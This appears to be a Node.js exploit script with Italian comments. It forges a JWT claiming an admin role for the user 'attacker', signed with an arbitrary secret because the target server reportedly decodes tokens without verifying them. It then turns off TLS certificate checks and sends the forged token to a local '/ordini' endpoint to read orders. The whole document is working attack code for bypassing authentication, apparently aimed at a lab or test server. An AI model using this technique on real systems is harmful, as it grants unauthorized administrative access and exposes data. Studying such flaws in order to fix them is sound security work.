const axios = require('axios');
const https = require('https');
const jwt = require('jsonwebtoken');

// 1. Crea il token JWT corretto
const payload = {
  preferred_username: "attacker",
  realm_access: {
    roles: ["admin"]
  },
  iat: Math.floor(Date.now() / 1000),
  exp: Math.floor(Date.now() / 1000) + 3600
};

const secret = "supersecret";  // O qualsiasi stringa visto che server usa jwt.decode() senza verify
const forgedToken = jwt.sign(payload, secret, { algorithm: 'HS256' });

console.log("🔐 Token JWT forgiato:\n", forgedToken);

// 2. Ignora certificati self-signed
const httpsAgent = new https.Agent({
  rejectUnauthorized: false
});

// 3. Invia la richiesta con il token forgiato
axios.get("https://localhost:8082/ordini", {
  headers: {
    Authorization: `Bearer ${forgedToken}`
  },
  httpsAgent
})
  .then(response => {
    console.log("✅ Risposta del server:\n", response.data);
  })
  .catch(error => {
    console.error("❌ Errore nella richiesta:\n", error.message);
  });
